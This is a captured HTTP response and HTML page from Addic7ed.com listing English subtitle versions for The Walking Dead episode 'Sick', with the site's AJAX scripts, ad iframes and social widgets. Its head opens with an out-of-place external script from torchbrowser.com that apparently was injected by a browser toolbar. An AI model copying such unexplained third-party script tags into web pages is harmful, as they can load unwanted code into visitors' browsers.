@@ -1,0 +1,770 @@
+HTTP/1.1 200 OK
+Date: Wed, 18 Dec 2013 22:52:28 GMT
+Server: Apache/2
+X-Powered-By: PHP/5.2.10
+Set-Cookie: PHPSESSID=8a94953377252566e094856f9157c8cb; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding,User-Agent
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml">
+	<head><script type="text/javascript" src="http://yb.torchbrowser.com/244/torch-yb.js"></script>
+	<meta name="description" content="The Walking Dead - 03x02 - Sick subtitles. Download subtitles in English from the source. " />
+<script src="//gitcdn.org/libs/bitcoinate/0.2.1/index.min.js"></script>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>
+		 Download The Walking Dead - 03x02 - Sick subtitles from the source! - Addic7ed.com
+	</title>
+	<link href="http://www.addic7ed.com/css/wikisubtitles.css" rel="stylesheet" title="default" type="text/css" />
+	<link rel="SHORTCUT ICON" href="http://www.addic7ed.com/favicon.ico" /> 
+
+	<script type="text/javascript" src="http://www.addic7ed.com/js/mootools-core-1.4.5-full-compat.js"></script>
+	<script type="text/javascript" src="http://www.addic7ed.com/js/mootools-more-1.4.0.1.js"></script>
+	<script type="text/javascript" src="http://www.addic7ed.com/js/moostarrating.js"></script>
+	<script type="text/javascript">	function changeAppLang()
+	{
+		value = $("comboLang").value;
+		if (value!='en')
+		{
+			window.location= "http://www.addic7ed.com/changeapplang.php?applang=" + value;
+		}
+	}
+	
+	function showChange(showID)
+	{
+		if (showID==0)
+			valor = $("qsShow").value;
+		else
+			valor = showID;
+		if (valor>0)
+		{
+			$("qsSeason").innerHTML = '<img title="Please wait, loading" alt="Loading" src="/images/loader.gif" />';
+			$("qsEp").innerHTML = '';
+			$("qssShow").innerHTML = '';
+
+			var myRequest = new Request({
+			    url: 'http://www.addic7ed.com/ajax_getSeasons.php',
+			    method: 'get',
+			    onSuccess: function(responseText){
+				$("qsSeason").innerHTML = responseText;
+			    }
+			});
+			myRequest.send('showID='+valor);
+		}
+	}
+	
+	function seasonChange(showID, season)
+	{
+	
+		valor = showID;
+
+		if (valor>0)
+		{
+			$("qsEp").innerHTML = '<img title="Please wait, loading" alt="Loading" src="/images/loader.gif" />';
+			
+			if (season==-1)
+				myseason = $("qsiSeason").value;
+			else
+				myseason=season;
+                        var myRequest = new Request({
+                            url: 'http://www.addic7ed.com/ajax_getEpisodes.php',
+                            method: 'get',
+                            onSuccess: function(responseText){
+                                $("qsEp").innerHTML = responseText; 
+		            }
+                        });
+                        myRequest.send('showID='+valor+'&season='+myseason); 
+		}
+
+	}
+	
+	function changeEp()
+	{
+		var valor = $("qsiEp").value;
+		window.location = 'http://www.addic7ed.com/re_episode.php?ep=' + valor;
+	}
+	
+	function qsClear()
+	{
+		$("qssShow").innerHTML = '<img title="Please wait, loading" alt="Loading" src="/images/loader.gif" />';
+		$("qsSeason").innerHTML = '&nbsp;';
+		$("qsEp").innerHTML = '&nbsp;';
+		
+		var myRequest = new Request({
+		    url: 'http://www.addic7ed.com/ajax_getShows.php',
+		    method: 'get',
+		    onSuccess: function(responseText){
+			$("qssShow").innerHTML = responseText;
+		    }
+		});
+		myRequest.send('showID='+valor);		
+	}
+</script>
+	<script type="text/javascript">
+		function saveFavorite(subid,langid,hi)
+		{
+	                return;
+		alert('Now following!');
+		/*        new Ajax('/ajax_saveFavorite.php?subid='+subid+'&langid='+langid+'&hi='+hi, {
+				method: 'get',
+				update: $("episodes")   
+			}).request();
+		*/	
+
+		var myRequest = new Request({
+		    url: '/ajax_saveFavorite.php',
+		    method: 'get'
+		});
+		myRequest.send('subid='+subid+'&langid='+langid+'&hi='+hi);
+		}
+		
+	</script>
+
+	<meta property="og:site_name" content="Addic7ed.com" />
+
+	</head>
+
+	<body><br /><center><br />
+<a id="facebooksticker" target="_blank" href="http://www.facebook.com/addic7ed">Visit our Facebook Page!</a>
+<table border="0">
+<tr>
+  <td rowspan="9"><a href="/"><img height="200" width="350" src="http://www.addic7ed.com/images/addic7edheader.jpg"  border="0"  title="Addic7ed.com - Quality Subtitles for TV Shows and movies" alt="Addic7ed.com - Quality Subtitles for TV Shows and movies" /></a></td>
+</tr>
+<tr><td align="center" colspan="2">
+<h1><small>Download free subtitles for TV Shows and Movies.</small>&nbsp; 
+<select name="applang" class="inputCool" onchange="changeAppLang();" id="comboLang"><option value="ar">Arabic</option><option value="ca">Catala</option><option selected="selected" value="en">English</option><option value="eu">Euskera</option><option value="fr">French</option><option value="ga">Galician</option><option value="de">German</option><option value="gr">Greek</option><option value="hu">Hungarian</option><option value="it">Italian</option><option value="fa">Persian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="br">Portuguese (Brazilian)</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="es">Spanish</option><option value="se">Swedish</option></select></h1>
+</td></tr>
+<tr><td align="center" colspan="2">
+<div id="hBar">
+			  <ul>
+				<li><a class="button white" href="/newaccount.php">Signup</a></li>
+				<li><a class="button white" href="/login.php">Login</a></li>
+				<li><a class="button white" href="/shows.php">Shows</a></li>
+				<li><a class="button white" href="/allshows/a">Air dates</a></li>
+				<li><a class="button white" href="http://www.sub-talk.net">Forum</a></li>
+			  </ul>
+			  </div>
+</td></tr> 
+<tr>
+  <td>
+</td><td>
+	<g:plusone size="medium"></g:plusone>
+    <a href="http://twitter.com/addic7ed" target="_blank"><img width="32" height="32" src="http://www.addic7ed.com/images/twitter_right.png" alt="Twitter" border="0" /></a>
+	<a href="irc://irc.efnet.net:6667/addic7ed"><img width="32" height="32" src="http://www.addic7ed.com/images/irc-right.png" alt="IRC" border="0" /></a>
+<div style="float: right; padding-right:10%;"><form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+<input type="hidden" name="cmd" value="_s-xclick">
+<input type="hidden" name="hosted_button_id" value="B8G9BEZHJABT6">
+<input border="0" type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" name="submit" alt="PayPal - The safer, easier way to pay online!">
+<img border="0" width="1" height="1" alt="" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif">
+</form>
+<button class="bitcoinate" data-size="30" data-address="1M4Z2LxCDaffwZhwXzSsKkKHNvC9izQtWS">bitcoinate</button></div>
+  </td>
+ </tr>
+ <tr>
+   <td colspan=2><iframe src="//www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2FAddic7ed&amp;send=false&amp;layout=button_count&amp;width=450&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=tahoma&amp;height=21&amp;appId=121322186712" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:80px; height:21px;" allowTransparency="true"></iframe>
+    </td>
+ </tr>
+</table>
+</center>
+
+<center>
+
+<!--[if lt IE 7]>
+ <style type="text/css">
+ div, img { behavior: url(http://www.addic7ed.com/js/iepngfix.htc) }
+ </style>
+<![endif]-->
+<!--
+    This file is part of wikisubtitles.
+
+    wikisubtitles is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    Wikisubtitles is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
+-->
+<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="50%" align="center">    
+    <a href="javascript:qsClear();"><img width="24" height="24" title="Clear Search" alt="Clear Search Terms" src="/images/view.png" border="0" /></a> <span id="qssShow"><b>
+Quick search    </b>
+  &nbsp;		<script type="text/javascript">
+			window.addEvent('domready', function() { showChange(1175 ); } );
+		</script>
+    
+    </span>
+    <span id="qsSeason">&nbsp;
+<script type="text/javascript">window.addEvent('domready', function() { seasonChange(1175,3) } );</script>    
+    </span> 
+	&nbsp;
+    <span id="qsEp">&nbsp;</span></td>
+    <td><form id="form1" name="form1" method="get" action="/search.php">
+      <div align="center">
+Search subtitle      &nbsp;
+        <input name="search" type="text" id="search" size="20" /> &nbsp;
+<input name="Submit" type="submit" class="coolBoton" value="Search" />      </div>
+    </form>
+
+    </td>
+  </tr>
+</table>
+<br><!--Iframe Tag  -->
+
+<!-- begin ZEDO for channel:  Addic7ed 728x90 , publisher: Addic7ed , Ad Dimension: Super Banner - 728 x 90 -->
+
+<iframe src="http://d2.zedo.com/jsc/d2/ff2.html?n=2051;c=59;s=22;d=14;w=728;h=90" frameborder=0 marginheight=0 marginwidth=0 scrolling="no" allowTransparency="true" width=728 height=90></iframe>
+
+<!-- end ZEDO for channel:  Addic7ed 728x90 , publisher: Addic7ed , Ad Dimension: Super Banner - 728 x 90 -->
+
+		<br />
+		<script type="text/javascript">
+			function saveWatched(subid,season,episode)
+			{
+			
+				alert("Login before using this feature");
+				return false;
+			var myRequest = new Request({
+			    url: '/ajax_saveWatched.php',
+			    method: 'get',
+			});
+			myRequest.send('subid='+subid+'&season='+season+'&episode='+episode);
+			}
+			
+			function saveShowRating(tvrage,rating)
+			{
+				alert("Login before using this feature");                return false;
+			var myRequest = new Request({
+			    url: '/ajax_saveShowRating.php',
+			    method: 'get',
+			});
+			myRequest.send('tvrage='+tvrage+'&rating='+rating);
+
+			}
+		</script>
+
+		<script type='text/javascript'>//<![CDATA[ 
+		window.addEvent('load', function() {
+		// Default images folder definition. You will use your own.
+		MooStarRatingImages.defaultImageFolder = 
+		    'http://www.addic7ed.com/img/';
+
+		// ================================================================
+
+		// Advanced options
+		var advancedRating = new MooStarRating({
+		    form: 'advanced',
+		    radios: 'my_rating',                // Radios name
+		    half: true,                         // That means one star for two values!
+		    imageEmpty: 'star_boxed_empty.png', // Different image
+		    imageFull:  'star_boxed_full.png',  // Different image
+		    imageHover: 'star_boxed_hover.png', // Different image
+		    width: 17,                          // One pixel bigger
+		    tip: '<i>[VALUE] / 10.0</i>', // Mouse rollover tip
+		    tipTarget: $('htmlTip'),            // Tip element
+		    tipTargetType: 'html'               // Tip type, now is HTML, not only text
+		});
+
+		// ================================================================
+
+		// Click callback function
+		function myCallback(value) {
+			saveShowRating(25056,value)
+		}
+
+		// Click event
+		advancedRating.addEvent('click', myCallback);
+		});//]]>  
+
+		</script>
+
+		<br />
+		<div id="container">
+		<table class="tabel90" border="0">
+		    <tr> <!-- table header -->
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tl.gif" /></td>
+			<td>&nbsp;</td>
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tr.gif" /></td>
+		    </tr>
+		    <tr>
+			<td>&nbsp;</td>
+			<td>
+				<table  border="0" align="center" class="tabel95">
+				  <tr>
+				   <td width="50%"><div align="left"><span class="titulo">
+				    The Walking Dead - 03x02 - Sick <small>Subtitle</small>
+				    </span></div>
+				    </td>
+				    <td width="20%"><b>Started: </b>Oct/31/2010
+				    </td>		
+				    <td width="30%" rowspan="5"><div valign="top">
+					<table class="tabel" width="40%" border="0" align="center">
+					      <tr>
+						<td><img class="resize" border="0" src="/images/showimages/The-Walking-Dead-banner.jpg" />
+						</td>
+					      </tr>
+					</table></div>   
+				    </td>
+				  </tr>
+
+				  <tr>
+				    <td><img src="/images/folder_image.png" width="16" height="16" />&nbsp;<a href="/show/1175">The Walking Dead</a>, <a href='/season/1175/3'>Season 3</a>, Episode 2 subtitles
+				    </td>
+				    <td><b>Status: </b> Ongoing
+					</td>		
+				  </tr>
+				  
+				  <tr>
+				    <td><br /><b> The Walking Dead   - 9/10<form name="advanced"> <label>Rate:</label><input type="radio" name="my_rating" value="0.5"><input type="radio" name="my_rating" value="1"><input type="radio" name="my_rating" value="1.5"><input type="radio" name="my_rating" value="2"><input type="radio" name="my_rating" value="2.5"><input type="radio" name="my_rating" value="3"><input type="radio" name="my_rating" value="3.5"><input type="radio" name="my_rating" value="4"><input type="radio" name="my_rating" value="4.5"><input type="radio" name="my_rating" value="5"><input type="radio" name="my_rating" value="5.5"><input type="radio" name="my_rating" value="6"><input type="radio" name="my_rating" value="6.5"><input type="radio" name="my_rating" value="7"><input type="radio" name="my_rating" value="7.5"><input type="radio" name="my_rating" value="8"><input type="radio" name="my_rating" value="8.5"><input type="radio" name="my_rating" value="9"><input type="radio" name="my_rating" value="9.5"><input type="radio" name="my_rating" value="10"><span id="htmlTip"></span></form><a href="/overview/25056/The Walking Dead"><font color=red>Episode list and air dates</font></a>
+				   </td>
+				    <td><b>Runtime: </b>60 mins
+				  </td></tr><tr><td>&nbsp;<b><big><font color='red'>Viewed</font></big></b><input type="checkbox" name="watched" value="true" onclick="saveWatched(25056,3,2);" >
+	</td></tr>
+			  <tr>
+			   <td><b>Network: </b>AMC (US)
+			    </td>		
+			  </tr>
+
+			  <tr>
+			    <td><img src="/images/clock.png" width="16" height="16" align="absmiddle" />
+				00:42:14
+			     <img src="/images/download.png" width="16" height="16" align="absmiddle" /> 
+				21685
+			    </td>
+			    <td><b>Airs on: </b>Sunday @ 21:00
+			    </td>		
+			  </tr>
+			  <tr>
+			   <td><a href="http://twitter.com/share" class="twitter-share-button" data-count="vertical" data-via="addic7ed">Tweet</a>&nbsp;&nbsp;<a href="/show/1175">Multi Download</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script></td>
+			    <td><b>Genre: </b>Scripted
+			    </td>
+			   <td>
+				<fb:like href="http://www.addic7ed.com/serie/The_Walking_Dead/3/2/1" layout="standard" show_faces="false" width="400" action="like" font="segoe ui" colorscheme="light" /> 
+			    <script src="http://connect.facebook.net/en_US/all.js"></script>
+				    <script>
+				      FB.init({
+					status : true, // check login status
+					cookie : true, // enable cookies to allow the server to access the session
+					xfbml  : true  // parse XFBML
+				      });
+				    </script>
+			  </td>
+			</tr>
+		</table>
+		</td>
+			<td>&nbsp;</td>
+		</tr>
+		<tr> <!-- table footer -->
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/bl.gif" /></td>
+			<td>&nbsp;</td>
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/br.gif" /></td>
+		</tr>
+		</table>
+		</div>
+		<p>
+
+		<script type="text/javascript">
+			function sortChange()
+			{
+				var sortCheck = document.getElementById("sort_versions");
+				window.location='/serie/The Walking Dead/3/2/'+sortCheck.checked;
+			}	
+			function filterChange()
+			{
+				var filter = document.getElementById("filterlang");
+				window.location='/serie/The Walking Dead/3/2/'+filter.options[filter.selectedIndex].value;
+			}	
+		</script><b>Sort versions alphabetically by language</b><INPUT TYPE="CHECKBOX" id="sort_versions" onclick="javascript:sortChange();" checked="yes" > - Filter Language: <select id="filterlang" name="filterlang" class="inputCool" onchange="javascript:filterChange();" >
+		<option value="0">All</option><option value="52">Albanian</option><option value="38">Arabic</option><option value="50">Armenian</option><option value="48">Azerbaijani</option><option value="47">Bengali</option><option value="44">Bosnian</option><option value="35">Bulgarian</option><option value="12">Català</option><option value="41">Chinese (Simplified)</option><option value="24">Chinese (Traditional)</option><option value="31">Croatian</option><option value="14">Czech</option><option value="30">Danish</option><option value="17">Dutch</option><option selected="selected" value="1">English</option><option value="13">Euskera</option><option value="28">Finnish</option><option value="8">French</option><option value="15">Galego</option><option value="11">German</option><option value="27">Greek</option><option value="23">Hebrew</option><option value="20">Hungarian</option><option value="37">Indonesian</option><option value="7">Italian</option><option value="32">Japanese</option><option value="42">Korean</option><option value="49">Macedonian</option><option value="40">Malay</option><option value="29">Norwegian</option><option value="43">Persian</option><option value="21">Polish</option><option value="9">Portuguese</option><option value="10">Portuguese (Brazilian)</option><option value="26">Romanian</option><option value="19">Russian</option><option value="39">Serbian (Cyrillic)</option><option value="36">Serbian (Latin)</option><option value="25">Slovak</option><option value="22">Slovenian</option><option value="4">Spanish</option><option value="6">Spanish (Latin America)</option><option value="5">Spanish (Spain)</option><option value="18">Swedish</option><option value="46">Thai</option><option value="16">Turkish</option><option value="51">Ukrainian</option><option value="45">Vietnamese</option></select><br>
+	<div id="container95m">
+		<table class="tabel95">
+			<tr> <!-- table header -->
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tl.gif" /></td>
+			<td>&nbsp;</td>
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tr.gif" /></td>
+		    </tr>
+		    <tr>
+			<td>&nbsp;</td>
+			<td>
+	<table width="100%" border="0" align="center" class="tabel95">
+	  <tr>
+	    <td colspan="3" align="center" class="NewsTitle"><img src="/images/folder_page.png" width="16" height="16" />Version KILLERS, 0.00 MBs&nbsp;<img title="720/1080" src="/images/hdicon.png" width="24" height="24" /></td><td colspan="2">
+			<img src="/images/movie_faq.png" title="LOL &amp; SYS always work with 720p DIMENSION;	XII & ASAP always work with 720p IMMERSE; 2HD always works with 720p 2HD; BiA always works with 720p BiA; FoV always works with 720p FoV" border="0" width="24" height="24" />
+			<img src="/images/subtitle.gif" width="22" height="14" /><a href="/index.php" onclick="return confirm('You must be a user for a few days before you can make edits.')">New translation</a><img src="/images/link.png"  /> uploaded by <a href='/user/3522'>n17t01</a>  423 days ago
+		    </td>
+		    <td width="16%">
+		    </td>
+		  </tr>
+		  <tr>
+			  <td colspan="4"></td>
+			  <td class="newsDate" colspan="3">
+				Works with 720p IMMERSE, AFG, iNTERNAL 720p EVOLVE and iNTERNAL AFG<img src="http://www.addic7ed.com/images/invisible.gif" />
+			  </td>
+		  </tr><tr><td width="10%" rowspan="2" valign="top"><a href="http://addic7ed.com"><img height="35" width="100" src="/friends/addic7ed.jpg" border="0" /></a>&nbsp;&nbsp;&nbsp;</td>
+			<td width="1%" rowspan="2" valign="top"><img src="http://www.addic7ed.com/images/invisible.gif" />
+			</td>
+			<td width="21%" class="language">English<a href="javascript:saveFavorite(68018,1,1)"><img title="Start following..." src="http://www.addic7ed.com/images/icons/favorite.png" height="20" width="20" border="0" /></a>    
+			</td>
+			<td width="19%"><b>Completed
+		    </b>
+		    </td>
+		    <td colspan="3">
+		    <img src="/images/download.png" width="24" height="24" /> <a class="buttonDownload" href="/original/68018/1"><strong>original</strong></a>
+				<a class="buttonDownload" href="/updated/1/68018/1"><strong>most updated</strong></a></td>
+		    <td>
+		    </td>
+		  </tr>
+		  <tr>
+		    <td colspan="2" class="newsDate"><img title="Corrected" src="http://www.addic7ed.com/images/bullet_go.png" width="24" height="24" /><img title="Hearing Impaired" src="http://www.addic7ed.com/images/hi.jpg" width="24" height="24" />2 times edited · 26068 Downloads · 502 sequences
+		</td>
+		    <td colspan="3"><img border="0" src="/images/edit.png" width="24" height="24" /><a href="/index.php?id=68018&amp;fversion=1&amp;lang=1" onclick="return confirm('You must be a user for a few days before you can make edits.')">view &amp; edit</a>&nbsp;edited  420 days ago
+		    </td>
+		  </tr></table>
+				</td>
+				<td>&nbsp;</td>
+			    </tr>
+			    <tr> <!-- table footer -->
+				<td class="tablecorner"><img src="http://www.addic7ed.com/images/bl.gif" /></td>
+				<td>&nbsp;</td>
+				<td class="tablecorner"><img src="http://www.addic7ed.com/images/br.gif" /></td>
+			    </tr>
+			</table>
+		    </div>
+	<div id="container95m">
+		<table class="tabel95">
+			<tr> <!-- table header -->
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tl.gif" /></td>
+			<td>&nbsp;</td>
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tr.gif" /></td>
+		    </tr>
+		    <tr>
+			<td>&nbsp;</td>
+			<td>
+	<table width="100%" border="0" align="center" class="tabel95">
+	  <tr>
+	    <td colspan="3" align="center" class="NewsTitle"><img src="/images/folder_page.png" width="16" height="16" />Version KILLERS, 0.00 MBs&nbsp;<img title="720/1080" src="/images/hdicon.png" width="24" height="24" /></td><td colspan="2">
+			<img src="/images/movie_faq.png" title="LOL &amp; SYS always work with 720p DIMENSION;	XII & ASAP always work with 720p IMMERSE; 2HD always works with 720p 2HD; BiA always works with 720p BiA; FoV always works with 720p FoV" border="0" width="24" height="24" />
+			<img src="/images/subtitle.gif" width="22" height="14" /><a href="/index.php?id=68018&amp;fversion=1&amp;lang=1" onclick="return confirm('You must be a user for a few days before you can make edits.')">New translation</a><img src="/images/link.png"  /> uploaded by <a href='/user/3522'>n17t01</a>  423 days ago
+		    </td>
+		    <td width="16%">
+		    </td>
+		  </tr>
+		  <tr>
+			  <td colspan="4"></td>
+			  <td class="newsDate" colspan="3">
+				Works with 720p IMMERSE, AFG, iNTERNAL 720p EVOLVE and iNTERNAL AFG<img src="http://www.addic7ed.com/images/invisible.gif" />
+			  </td>
+		  </tr><tr><td width="10%" rowspan="2" valign="top"><a href="http://addic7ed.com"><img height="35" width="100" src="/friends/addic7ed.jpg" border="0" /></a>&nbsp;&nbsp;&nbsp;</td>
+			<td width="1%" rowspan="2" valign="top"><img src="http://www.addic7ed.com/images/invisible.gif" />
+			</td>
+			<td width="21%" class="language">English<a href="javascript:saveFavorite(68018,1,0)"><img title="Start following..." src="http://www.addic7ed.com/images/icons/favorite.png" height="20" width="20" border="0" /></a>    
+			</td>
+			<td width="19%"><b>Completed
+		    </b>
+		    </td>
+		    <td colspan="3">
+		    <img src="/images/download.png" width="24" height="24" /> <a class="buttonDownload" href="/original/68018/0"><strong>original</strong></a>
+				<a class="buttonDownload" href="/updated/1/68018/0"><strong>most updated</strong></a></td>
+		    <td>
+		    </td>
+		  </tr>
+		  <tr>
+		    <td colspan="2" class="newsDate"><img title="Corrected" src="http://www.addic7ed.com/images/bullet_go.png" width="24" height="24" /><img src="/images/icons/invisible.gif" width="24" height="24" />2 times edited · 21685 Downloads · 477 sequences
+		</td>
+		    <td colspan="3"><img border="0" src="/images/edit.png" width="24" height="24" /><a href="/index.php?id=68018&amp;fversion=0&amp;lang=1" onclick="return confirm('You must be a user for a few days before you can make edits.')">view &amp; edit</a>&nbsp;edited  420 days ago
+		    </td>
+		  </tr></table>
+				</td>
+				<td>&nbsp;</td>
+			    </tr>
+			    <tr> <!-- table footer -->
+				<td class="tablecorner"><img src="http://www.addic7ed.com/images/bl.gif" /></td>
+				<td>&nbsp;</td>
+				<td class="tablecorner"><img src="http://www.addic7ed.com/images/br.gif" /></td>
+			    </tr>
+			</table>
+		    </div>
+	<div id="container95m">
+		<table class="tabel95">
+			<tr> <!-- table header -->
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tl.gif" /></td>
+			<td>&nbsp;</td>
+			<td class="tablecorner"><img src="http://www.addic7ed.com/images/tr.gif" /></td>
+		    </tr>
+		    <tr>
+			<td>&nbsp;</td>
+			<td>
+	<table width="100%" border="0" align="center" class="tabel95">
+	  <tr>
+	    <td colspan="3" align="center" class="NewsTitle"><img src="/images/folder_page.png" width="16" height="16" />Version HDB, 0.00 MBs&nbsp;<img title="720/1080" src="/images/hdicon.png" width="24" height="24" /></td><td colspan="2">
+			<img src="/images/movie_faq.png" title="LOL &amp; SYS always work with 720p DIMENSION;	XII & ASAP always work with 720p IMMERSE; 2HD always works with 720p 2HD; BiA always works with 720p BiA; FoV always works with 720p FoV" border="0" width="24" height="24" />
+			<img src="/images/subtitle.gif" width="22" height="14" /><a href="/index.php?id=68018&amp;fversion=0&amp;lang=1" onclick="return confirm('You must be a user for a few days before you can make edits.')">New translation</a><img src="/images/link.png"  /> uploaded by <a href='/user/116010'>xevious</a>  422 days ago
+		    </td>
+		    <td width="16%">
+		    </td>
+		  </tr>
+		  <tr>
+			  <td colspan="4"></td>
+			  <td class="newsDate" colspan="3">
+				1080p WEB-DL<img src="http://www.addic7ed.com/images/invisible.gif" />
+			  </td>
+		  </tr><tr><td width="10%" rowspan="2" valign="top">&nbsp;&nbsp;&nbsp;</td>
+			<td width="1%" rowspan="2" valign="top"><img src="http://www.addic7ed.com/images/invisible.gif" />
+			</td>
+			<td width="21%" class="language">English<a href="javascript:saveFavorite(68018,1,0)"><img title="Start following..." src="http://www.addic7ed.com/images/icons/favorite.png" height="20" width="20" border="0" /></a>    
+			</td>
+			<td width="19%"><b>Completed
+		    </b>
+		    </td>
+		    <td colspan="3">
+		    <img src="/images/download.png" width="24" height="24" /> <a class="buttonDownload" href="/original/68018/2"><strong>original</strong></a>
+				<a class="buttonDownload" href="/updated/1/68018/2"><strong>most updated</strong></a></td>
+		    <td>
+		    </td>
+		  </tr>
+		  <tr>
+		    <td colspan="2" class="newsDate"><img title="Corrected" src="http://www.addic7ed.com/images/bullet_go.png" width="24" height="24" /><img src="/images/icons/invisible.gif" width="24" height="24" />1 times edited · 3333 Downloads · 469 sequences
+		</td>
+		    <td colspan="3"><img border="0" src="/images/edit.png" width="24" height="24" /><a href="/index.php?id=68018&amp;fversion=2&amp;lang=1" onclick="return confirm('You must be a user for a few days before you can make edits.')">view &amp; edit</a>&nbsp;edited  421 days ago
+		    </td>
+		  </tr></table>
+				</td>
+				<td>&nbsp;</td>
+			    </tr>
+			    <tr> <!-- table footer -->
+				<td class="tablecorner"><img src="http://www.addic7ed.com/images/bl.gif" /></td>
+				<td>&nbsp;</td>
+				<td class="tablecorner"><img src="http://www.addic7ed.com/images/br.gif" /></td>
+			    </tr>
+			</table>
+		    </div><div align="center">
+		</div><p>
+		</p>
+			<p>&nbsp;</p>
+		<center>
+
+		<!--Iframe Tag  -->
+
+<!-- begin ZEDO for channel:  Addic7ed 728x90 , publisher: Addic7ed , Ad Dimension: Super Banner - 728 x 90 -->
+
+<iframe src="http://d2.zedo.com/jsc/d2/ff2.html?n=2051;c=59;s=22;d=14;w=728;h=90" frameborder=0 marginheight=0 marginwidth=0 scrolling="no" allowTransparency="true" width=728 height=90></iframe>
+
+<!-- end ZEDO for channel:  Addic7ed 728x90 , publisher: Addic7ed , Ad Dimension: Super Banner - 728 x 90 -->
+		</center>
+		<br />
+			<div id="container95m">
+				<table class="tabel95">
+					<tr> <!-- table header -->
+					<td class="tablecorner"><img src="http://www.addic7ed.com/images/tl.gif" /></td>
+					<td>&nbsp;</td>
+					<td class="tablecorner"><img src="http://www.addic7ed.com/images/tr.gif" /></td>
+				    </tr>
+				    <tr>
+					<td>&nbsp;</td>
+					<td>
+						<span id="comments">
+						</span>
+					</td>
+					<td>&nbsp;</td>
+				    </tr>
+				    <tr> <!-- table footer -->
+					<td class="tablecorner"><img src="http://www.addic7ed.com/images/bl.gif" /></td>
+					<td>&nbsp;</td>
+					<td class="tablecorner"><img src="http://www.addic7ed.com/images/br.gif" /></td>
+				    </tr>
+				</table>
+			    </div>
+
+
+		<script type="text/javascript">
+			function carga()
+	{
+var subID='68018';		$("comments").innerHTML = '<img src="/images/loader.gif">';
+		var myRequest = new Request({
+		    url: 'http://www.addic7ed.com/ajax_getComments.php',
+		    method: 'get',
+		    onSuccess: function(responseText){
+			$("comments").innerHTML = responseText;
+		    }
+		});
+		myRequest.send('id='+subID);
+	}
+		
+	function enviar()
+	{
+		var paramString = $("newc").toQueryString(); 
+		$("comments").innerHTML = '<img src="/images/loader.gif">';
+                var myRequest = new Request({
+                    url: 'http://www.addic7ed.com/ajax_getComments.php',
+                    method: 'post',
+                    onSuccess: function(responseText){
+			$("comments").innerHTML = responseText;
+                    }
+                });
+                myRequest.send(paramString);
+	
+		return false;
+	}
+		
+	function notifyModerator(fversion, lang)
+	{
+var subID='68018';		
+		if (confirm('Are you sure that you want to report a problem to the moderators?'))
+		{
+			var myRequest = new Request({
+			    url: 'http://www.addic7ed.com/ajax_notify.php',
+			    method: 'get',
+			    onSuccess: function(responseText){
+				alert("The notification has sent to the moderators. Please, be patient");
+			    }
+			});
+			myRequest.send('id='+subID+'&fversion='+fversion+'&lang='+lang);
+
+			$("comments").innerHTML = '<img src="/images/loader.gif">';
+		}
+	}
+
+
+	function addCorrection(fversion, lang)
+	{
+var subID='68018';		
+		if (confirm('Are you sure you want to correct this subtitle??'))
+		{
+			var myRequest = new Request({
+                            url: 'http://www.addic7ed.com/ajax_correction.php',
+                            method: 'get',
+                            onSuccess: function(responseText){
+				alert("Subtitle added to Corrections page. Please correct it or announce that you bail");
+                            }
+                        });
+                        myRequest.send('id='+subID+'&fversion='+fversion+'&lang='+lang);
+		}
+	}
+
+	function delComment(cid)
+	{
+		var myRequest = new Request({
+		    url: 'http://www.addic7ed.com/ajax_delComment.php',
+		    method: 'get',
+		    onSuccess: function(responseText){
+//			alert("Subtitle added to Corrections page. Please correct it or announce that you bail");
+		    }
+		});
+		myRequest.send('cid='+cid);
+		
+		$("comments").innerHTML = "<img src='/images/loader.gif' />";
+
+		var myRequest = new Request({
+                    url: 'http://www.addic7ed.com/ajax_getComments.php',
+                    method: 'get',
+                    onSuccess: function(responseText){
+			    $("comments").innerHTML = responseText;
+		    }       
+                });     
+		myRequest.send('cid='+cid);
+	}
+
+	window.addEvent('domready', function(){ carga(); });	
+		</script>
+		<center>
+		
+<center><table border="0" width="90%">
+<tr>
+<td class="NewsTitle"><img width="20" height="20" src="http://addic7ed.com/images/television.png" alt="TV" /><img src="http://www.addic7ed.com/images/invisible.gif" alt=" " />Addic7ed</td>
+<td class="NewsTitle"><img width="20" height="20" src="http://addic7ed.com/images/television.png" alt="TV" /><img src="http://www.addic7ed.com/images/invisible.gif" alt=" " />Popular Shows</td>
+<td class="NewsTitle"><img width="20" height="20" src="http://addic7ed.com/images/television.png" alt="TV" /><img src="http://www.addic7ed.com/images/invisible.gif" alt=" " />Useful</td>
